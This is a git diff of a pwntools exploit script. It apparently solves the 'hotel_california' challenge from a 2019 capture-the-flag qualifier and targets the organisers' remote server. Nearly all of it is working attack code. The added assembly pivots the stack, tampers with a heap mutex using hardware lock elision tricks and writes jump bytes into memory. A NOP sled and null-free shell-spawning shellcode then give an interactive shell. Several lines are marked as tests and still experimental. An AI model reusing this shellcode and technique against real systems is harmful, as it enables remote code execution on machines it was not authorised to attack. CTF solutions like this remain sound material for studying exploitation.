@@ -1,5 +1,6 @@
 #!/usr/bin/env python2
 from pwn import *
+import time
 
 context.binary = "hotel_california_norandom"
 
@@ -8,7 +9,7 @@ context.binary = "hotel_california_norandom"
 ##########################
 
 if args.LOCAL:
-    p = process(argv=["/root/Downloads/sde-external-8.35.0-2019-03-11-lin/sde64", "-hle_enabled", "-hle_abort_log", "--", context.binary.path])
+    p = process(argv=["/root/Downloads/sde-external-8.35.0-2019-03-11-lin/sde64", "-hle_enabled", "-hle_abort_log", "-debug", "--", context.binary.path])
     """raw_input('\n'.join([
         '',
         'attach {}'.format(p.pid),
@@ -16,8 +17,8 @@ if args.LOCAL:
         '',
         '[ENTER]'
        ]))"""
-    #print p.recvlines(3)[-1]
-    #print "continue"
+    print p.recvlines(3)[-1]
+    print "continue"
 
 else:
     p = remote("hotelcalifornia.quals2019.oooverflow.io", 7777)
@@ -27,14 +28,18 @@ p.recvuntil(' > ')
 p.send('\x90'*1023 + '\x00')
 
 p.recvuntil(' > ')
-#p.send("\x90"*800 + '\x00')
-#p.recvuntil(' > ')
+
+# Exploit
+addr = 0x555555757260#int(raw_input("val> "), 16)
 
 payload = asm("""
-        /* rsp now .bss */
+        /* rsp now end of .bss */
         add r11, 0x02010101;
         sub r11, 31519071;
         mov rsp, r11;
+
+        /* save rsp init position */
+        mov r15,rsp;
 
         /* libc rw address in rax */
         mov rax,[rsp+24];
@@ -45,18 +50,40 @@ payload = asm("""
         /* rdi has heap addr */
         mov rdi,[rax];
 
-        /* fix rdi pointer */
+        /* fix rdi pointer, points at mutex */
         add rdi,-2128;
 
+        /* restore stack pointer to bss */
+        mov rsp,r15;
 
-        xrelease mov DWORD PTR [rdi], 0x43434343""")
+        mov r15,rdi;
+        add r15,5;
+        mov WORD PTR [r15],0x7feb;
+
+        /* testing */;
+        mov r10, rdi;
+        sub r10,4;
+        /*or WORD PTR [r10], 0xb848;*/
+        mov DWORD PTR [r10], 0x07c7f390;
+        pop r15;
+        call r10;
+
+        /* should be broken out after two instruction */
+        """)
+        #xrelease mov DWORD PTR [rdi], 0x43434343""")
 if "\x00" in payload:
     print "null in payload"
     print repr(payload)
     exit()
 
-payload += encoder.null(asm("mov rsp, rax;" + shellcraft.sh()))
+#payload = ""
+final_shellcode = encoder.null(asm("mov rsp, rax;" + shellcraft.sh()))
+prelude = asm("xor r12,rdi") + "\x74\x7f" + final_shellcode
+
 
 print "payload len:", len(payload)
-p.send(payload + "\x90"*(800-len(payload))+'\x00')
+print "prelude len:", len(prelude)
+pad_len = 800 - len(prelude) - len(payload) - 200
+p.send("\x90"*pad_len + prelude + "\x90"*200 + payload + '\x00')
+#p.recvuntil(' > ')
 p.interactive()
